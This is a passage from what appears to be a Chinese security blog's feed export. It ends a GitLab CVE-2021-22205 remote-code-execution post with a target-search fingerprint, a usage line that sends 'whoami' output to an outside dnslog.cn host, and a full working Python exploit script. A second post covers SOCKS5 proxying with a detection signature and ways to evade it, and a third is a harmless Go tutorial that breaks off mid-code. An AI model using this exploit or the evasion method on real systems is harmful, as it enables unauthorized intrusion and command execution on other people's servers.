class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;users&#x2F;sign_in</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/1c4475180f04e1597616e06f7ab8244f.png" alt="image-20211031101923873"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOFA指纹：title&#x3D;&quot;GitLab&quot;</span><br></pre></td></tr></table></figure><p>EXP代码贴最后,直接运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2021-22205.py -u http://12.0.0.1:8080 -c "curl \`whoami\`.7kwtfs.dnslog.cn"</span><br></pre></td></tr></table></figure><p>我用的是DNSlog探测的，纯内网环境也可以反弹到自己的http服务测试</p><p><img src="https://img-blog.csdnimg.cn/img_convert/687865b7e5d573dceb642e6c69de33f3.png" alt="image-20211031134306084"></p><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a><strong>0x04 修复建议</strong></h1><ul><li>升级至最新版本</li><li>官方链接：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;about.gitlab.com&#x2F;update&#x2F;</span><br></pre></td></tr></table></figure><h1 id="EXP代码"><a href="#EXP代码" class="headerlink" title="EXP代码"></a>EXP代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'''</span></span><br><span class="line"><span class="string">        GitLab &lt; 13.10.3 RCE</span></span><br><span class="line"><span class="string">        python3 CVE-2021-22205.py -u target_url -c command </span></span><br><span class="line"><span class="string">        '''</span>)    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(target_url,command)</span>:</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req_token = session.get(target_url.strip(<span class="string">"/"</span>) + <span class="string">"/users/sign_in"</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        soup = BeautifulSoup(req_token.text, features=<span class="string">"lxml"</span>)</span><br><span class="line">        token = soup.findAll(<span class="string">'meta'</span>)[<span class="number">16</span>].get(<span class="string">"content"</span>)</span><br><span class="line">        data = <span class="string">"\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&amp;TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx&#123;"</span>+  command +<span class="string">"&#125; . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"</span>,</span><br><span class="line">            <span class="string">"Connection"</span>: <span class="string">"close"</span>,</span><br><span class="line">            <span class="string">"Content-Type"</span>: <span class="string">"multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5"</span>,</span><br><span class="line">            <span class="string">"X-CSRF-Token"</span>: <span class="string">f"<span class="subst">&#123;token&#125;</span>"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>&#125;</span><br><span class="line">        flag = <span class="string">'Failed to process image'</span></span><br><span class="line">        req_exp = session.post(target_url.strip(<span class="string">"/"</span>) + <span class="string">"/uploads/user"</span>, data=data, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> req_exp.text:</span><br><span class="line">            print(<span class="string">"&#123;&#125; 存在漏洞,CMD执行成功"</span>.format(target_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"&#123;&#125; 不存在漏洞"</span>.format(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">"http"</span>:</span><br><span class="line">            url = <span class="string">"https://"</span> + url</span><br><span class="line">            url = url.strip()</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'URL.error&#123;0&#125;'</span>.format(url))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    title()</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">'-u'</span>, <span class="string">'--url'</span>, type=str, help=<span class="string">'url'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--command'</span>, type=str, help=<span class="string">'cmd'</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    target_url = args.url</span><br><span class="line">    command = args.command</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> target_url != <span class="literal">None</span> <span class="keyword">and</span> command != <span class="literal">None</span>:</span><br><span class="line">        exp(target_url,command)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sys.exit(<span class="number">0</span>)   </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python 安全 漏洞 gitlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网代理流量：Socks5协议原理分析和编程</title>
      <link href="/2021/10/29/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%B5%81%E9%87%8F%EF%BC%9ASocks5%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8C%E7%BC%96%E7%A8%8B/"/>
      <url>/2021/10/29/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%B5%81%E9%87%8F%EF%BC%9ASocks5%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前情提要"><a href="#0x00-前情提要" class="headerlink" title="0x00 前情提要"></a>0x00 前情提要</h1><p>日常渗透演练中，代理是必不可少的，我们用的一般也都是CS自带socks4和代理工具的socks5协议，我们此时还要考虑在这个过程中的流量免杀的问题，所以还是要对底层的协议详细的看一下，然后对流量中的特征分析和修改一下</p><h1 id="0x01-简介和流程"><a href="#0x01-简介和流程" class="headerlink" title="0x01 简介和流程"></a>0x01 简介和流程</h1><p>以下摘自维基百科</p><blockquote><p><strong>SOCKS</strong>是一种<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">网络传输协议</a>，主要用于客户端与外网服务器之间通讯的中间传递。SOCKS是”SOCKetS”的<a href="https://zh.wikipedia.org/wiki/%E7%BC%A9%E5%86%99" target="_blank" rel="noopener">缩写</a>[<a href="https://zh.wikipedia.org/wiki/SOCKS#cite_note-1" target="_blank" rel="noopener">注 1]</a>。 当<a href="https://zh.wikipedia.org/wiki/防火墙_(网络)" target="_blank" rel="noopener">防火墙</a>后的客户端要访问外部的服务器时，就跟SOCKS<a href="https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">代理服务器</a>连接。这个代理服务器控制客户端访问外网的资格，允许的话，就将客户端的请求发往外部的服务器。 这个协议最初由David Koblas开发，而后由NEC的Ying-Da Lee将其扩展到SOCKS4。最新协议是SOCKS5，与前一版本相比，增加支持<a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">UDP</a>、验证，以及<a href="https://zh.wikipedia.org/wiki/IPv6" target="_blank" rel="noopener">IPv6</a>。 根据<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B" target="_blank" rel="noopener">OSI模型</a>，SOCKS是<a href="https://zh.wikipedia.org/wiki/%E4%BC%9A%E8%AF%9D%E5%B1%82" target="_blank" rel="noopener">会话层</a>的协议，位于<a href="https://zh.wikipedia.org/wiki/%E8%A1%A8%E7%A4%BA%E5%B1%82" target="_blank" rel="noopener">表示层</a>与<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82" target="_blank" rel="noopener">传输层</a>之间。 SOCKS协议不提供<a href="https://zh.wikipedia.org/wiki/%E5%8A%A0%E5%AF%86" target="_blank" rel="noopener">加密</a>。</p></blockquote><p>小知识点：SOCKS 5 扩展了第 4 版本，加入了 UDP 协议支持</p><p>SOCKS5协议主要分为分为三个阶段：</p><ul><li>(1) 协议版本及认证方式</li><li>(2) 根据认证方式执行对应的认证</li><li>(3) 请求信息</li></ul><p>下面就对这几个流程详细的分析一下，附带一点点 Go的伪代码看着方便</p><h1 id="0x02-Socks5Auth-授权认证"><a href="#0x02-Socks5Auth-授权认证" class="headerlink" title="0x02 Socks5Auth 授权认证"></a>0x02 Socks5Auth <strong>授权认证</strong></h1><h2 id="客户端需要先发起请求来对协议的版本及其认证方式。"><a href="#客户端需要先发起请求来对协议的版本及其认证方式。" class="headerlink" title="客户端需要先发起请求来对协议的版本及其认证方式。"></a>客户端需要先发起请求来对协议的版本及其认证方式。</h2><p>这里就是<strong>客户端</strong>请求服务器的请求格式</p><table><thead><tr><th>VER</th><th>本次请求的协议版本号，socks 5取固定值 0x05</th></tr></thead><tbody><tr><td>NMETHODS</td><td>客户端支持的认证方式数量，可取值 1~255</td></tr><tr><td>METHODS</td><td>可用的认证方式列表</td></tr></tbody></table><h2 id="然后服务端得选择一种认证方式，告诉客户端："><a href="#然后服务端得选择一种认证方式，告诉客户端：" class="headerlink" title="然后服务端得选择一种认证方式，告诉客户端："></a>然后服务端得选择一种认证方式，告诉客户端：</h2><table><thead><tr><th>VER</th><th>VER这里指定的就是socks的版本，也就是0x05</th></tr></thead><tbody><tr><td>METHOD</td><td>选定的认证方式；其中 0x00 表示不需要认证，0x02 是用户名/密码认证，……</td></tr></tbody></table><p>METHOD目前支持的验证方式一般就用两种：</p><ul><li>0x00 （不需要验证）</li><li>0x20 （用户名、密码认证）</li></ul><p>，例如我们这里是socks5的话接受的肯定就是0x05，并且我们设定不需要验证。那么就是0x00不需要验证</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//无需认证 直接返回 0x05 0x00 就好了</span></span><br><span class="line">n, err = client.Write([]byte&#123;<span class="number">0x05</span>, <span class="number">0x00</span>&#125;)</span><br></pre></td></tr></table></figure><h1 id="0x03-socks5协议解析之建立连接"><a href="#0x03-socks5协议解析之建立连接" class="headerlink" title="0x03 socks5协议解析之建立连接"></a>0x03 socks5协议解析之建立连接</h1><p>Socket5的客户端和服务端进行双方授权验证通过之后，就开始建立连接了。连接由客户端发起，告诉Sokcet服务端客户端需要访问哪个远程服务器，其中包含，远程服务器的地址和端口，地址可以是IP4，IP6，也可以是域名。</p><table><thead><tr><th>VER</th><th>VER这里指定的就是socks的版本，也就是0x05</th></tr></thead><tbody><tr><td>REP</td><td>状态码，0x00=成功，0x01=未知错误，……</td></tr><tr><td>RSV</td><td>依然是没卵用的 RESERVED</td></tr><tr><td>ATYP</td><td>地址类型</td></tr><tr><td>BND.ADDR</td><td>服务器和DST创建连接用的地址</td></tr><tr><td>BND.PORT</td><td>服务器和DST创建连接用的端口</td></tr></tbody></table><ul><li><p>VER代表Socket协议的版本，Soket5默认为0x05，其值长度为1个字节</p></li><li><p>CMD代表客户端请求的类型，值长度也是1个字节，有三种类型</p><ul><li>CONNECT 0x01</li><li>BIND 0x02</li><li>UDP ASSOCIATE 0x03’</li></ul></li><li><p>RSV保留字，值长度为1个字节</p></li><li><p>ATYP代表请求的远程服务器地址类型，值长度1个字节，常用的就三种类型</p></li><li><pre><code class="javascript"><span class="number">1</span>：表示是一个IPV4地址（IP V4 address）；<span class="number">3</span>：表示是一个域名（DOMAINNAME）；<span class="number">4</span>：表示是一个IPV6地址（IP V6 address）；&lt;!--￼<span class="number">1</span>--&gt;</code></pre></li></ul><p>这个也是一个比较有意思的地方，在做流量免杀</p><h1 id="0x03-建立链接之后的数据转发"><a href="#0x03-建立链接之后的数据转发" class="headerlink" title="0x03 建立链接之后的数据转发"></a>0x03 建立链接之后的数据转发</h1><p>最后完成链接之后就是需要进行数据转发了，这个操作和写端口转发的一样的，通过io.Copy()把两个端口的的流量进行转发即可</p><p>由于 golang 有一个 io.Copy ，所以使用还是十分简单的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">forward := <span class="function"><span class="keyword">func</span><span class="params">(src, dest net.Conn)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> src.Close()</span><br><span class="line">    <span class="keyword">defer</span> dest.Close()</span><br><span class="line">    io.Copy(src, dest)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> forward(client, target)</span><br><span class="line"><span class="keyword">go</span> forward(target, client)</span><br></pre></td></tr></table></figure><h1 id="0x04-流量检测问题"><a href="#0x04-流量检测问题" class="headerlink" title="0x04 流量检测问题"></a>0x04 流量检测问题</h1><p>这边只有天眼的测试，这种认证可以轻松被识别出来，因为匹配的规则在分析之后一下就明白了，这是服务端响应客户端<strong>连接成功</strong>的规则，所以天眼检测就是这个成功攻击的规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00&#125;</span><br></pre></td></tr></table></figure><p>天眼的检测PAYLOAD：<img src="https://img-blog.csdnimg.cn/img_convert/993bfb7e73c2d7e3f7603196cce18bd6.png" alt=""></p><h1 id="0x05-流量免杀"><a href="#0x05-流量免杀" class="headerlink" title="0x05 流量免杀"></a>0x05 流量免杀</h1><p>既然知道规则，那么免杀那就好说多了，因为这是socks认证的过程，虽然可以改服务端，但是我们的工具都是正常协议的socks5协议，那么客户端也得改，所以改认证其实不是很方便。所以最简单的实现方法在中间加一条隧道就好了。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8b2fffe2aad5226fa649b36b636d2de9.png" alt="image-20211027203826936"></p><p>实际是可以规避流量检测，但是我写的时候没注意，是正向的连接的额，实战用还是写成有客户端主动外链的，所以没啥大用处，再重新改一下得。。。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 安全 web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速掌握GO语言面向对象类的实现</title>
      <link href="/2021/10/25/%E5%BF%AB%E9%80%9F%E6%8E%8C%E6%8F%A1GO%E8%AF%AD%E8%A8%80%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%B1%BB%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
      <url>/2021/10/25/%E5%BF%AB%E9%80%9F%E6%8E%8C%E6%8F%A1GO%E8%AF%AD%E8%A8%80%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%B1%BB%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="结构体struct"><a href="#结构体struct" class="headerlink" title="结构体struct"></a>结构体struct</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明一种行的数据类型 myint， 是int的一个别名</span></span><br><span class="line"><span class="keyword">type</span> myint <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个结构体</span></span><br><span class="line"><span class="keyword">type</span> Book <span class="keyword">struct</span> &#123;</span><br><span class="line">   title <span class="keyword">string</span></span><br><span class="line">   auth  <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">changeBook</span><span class="params">(book Book)</span></span> &#123;</span><br><span class="line">   <span class="comment">//传递一个book的副本</span></span><br><span class="line">   book.auth = <span class="string">"666"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">changeBook2</span><span class="params">(book *Book)</span></span> &#123;</span><br><span class="line">   <span class="comment">//指针传递</span></span><br><span class="line">   book.auth = <span class="string">"777"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">      var a myint = 10</span></span><br><span class="line"><span class="comment">      fmt.Println("a = ", a)</span></span><br><span class="line"><span class="comment">      fmt.Printf("type of a = %T\n", a)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> book1 Book</span><br><span class="line">   book1.title = <span class="string">"Golang"</span></span><br><span class="line">   book1.auth = <span class="string">"zhang3"</span></span><br><span class="line"></span><br><span class="line">   fmt.Printf(<span class="string">"%v\n"</span>, book1)</span><br><span class="line"></span><br><span class="line">   changeBook(book1)</span><br><span class="line"></span><br><span class="line">   fmt.Printf(<span class="string">"%v\n"</span>, book1)</span><br><span class="line"></span><br><span class="line">   changeBook2(&amp;book1)</span><br><span class="line"></span><br><span class="line">   fmt.Printf(<span class="string">"%v\n"</span>, book1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>GO语言中的类，主要实现就是通过结构体区绑定方法。</p><p>这里主要主要的首字母大小写：</p><ul><li>如果类名首字母大写，表示其他包也能够访问 类似于Public 公有的方法</li><li>如果说类的属性首字母大写, 表示该属性是对外能够访问的，否则的话只能够类的内部访问</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果类名首字母大写，表示其他包也能够访问</span></span><br><span class="line"><span class="keyword">type</span> Hero <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">//如果说类的属性首字母大写, 表示该属性是对外能够访问的，否则的话只能够类的内部访问</span></span><br><span class="line">Name  <span class="keyword">string</span></span><br><span class="line">Ad    <span class="keyword">int</span></span><br><span class="line">level <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//this *Hero 要加指针才能是 对象，否则只是一个副本</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Hero)</span> <span class="title">Show</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"Name = "</span>, this.Name)</span><br><span class="line">fmt.Println(<span class="string">"Ad = "</span>, this.Ad)</span><br><span class="line">fmt.Println(<span class="string">"Level = "</span>, this.level)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Hero)</span> <span class="title">GetName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> this.Name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Hero)</span> <span class="title">SetName</span><span class="params">(newName <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">//this 是调用该方法的对象的一个副本（拷贝）</span></span><br><span class="line">this.Name = newName</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//创建一个对象</span></span><br><span class="line">hero := Hero&#123;Name: <span class="string">"zhang3"</span>, Ad: <span class="number">100</span>&#125;</span><br><span class="line"></span><br><span class="line">hero.Show()</span><br><span class="line"></span><br><span class="line">hero.SetName(<span class="string">"li4"</span>)</span><br><span class="line"></span><br><span class="line">hero.Show()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">type Father struct &#123;</span><br><span class="line">Hero</span><br><span class="line">Ad    int</span><br><span class="line">level int</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;类的继承直接加入结构体里面就好了</span><br></pre></td></tr></table></figure><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>父类申请一个接口，子类不需要继承，直接实现全部方法就好了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//本质是一个指针</span></span><br><span class="line"><span class="keyword">type</span> AnimalIF <span class="keyword">interface</span> &#123;</span><br><span class="line">   Sleep()</span><br><span class="line">   GetColor() <span class="keyword">string</span> <span class="comment">//获取动物的颜色</span></span><br><span class="line">   GetType() <span class="keyword">string</span>  <span class="comment">//获取动物的种类</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//具体的类</span></span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span> &#123;</span><br><span class="line">   color <span class="keyword">string</span> <span class="comment">//猫的颜色</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Cat)</span> <span class="title">Sleep</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(<span class="string">"Cat is Sleep"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Cat)</span> <span class="title">GetColor</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">   <span class="keyword">return</span> this.color</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Cat)</span> <span class="title">GetType</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">"Cat"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//具体的类</span></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span> &#123;</span><br><span class="line">   color <span 